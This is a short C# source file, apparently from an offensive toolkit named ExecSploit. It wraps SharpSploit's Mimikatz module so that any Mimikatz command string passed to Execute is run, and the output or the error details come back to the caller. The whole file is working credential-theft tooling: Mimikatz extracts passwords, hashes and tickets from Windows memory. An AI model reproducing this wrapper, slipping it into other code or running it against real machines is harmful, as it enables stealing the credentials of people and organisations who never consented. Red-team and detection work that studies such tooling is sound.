using System;
using SharpSploit.Credentials;

namespace ExecSploit
{
    public static class Mimikatz
    {
        public static string Execute(string Command)
        {
            try
            {
                 return SharpSploit.Credentials.Mimikatz.Command(Command);
            }
            catch (Exception e) { Console.WriteLine("[!] Error"); return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}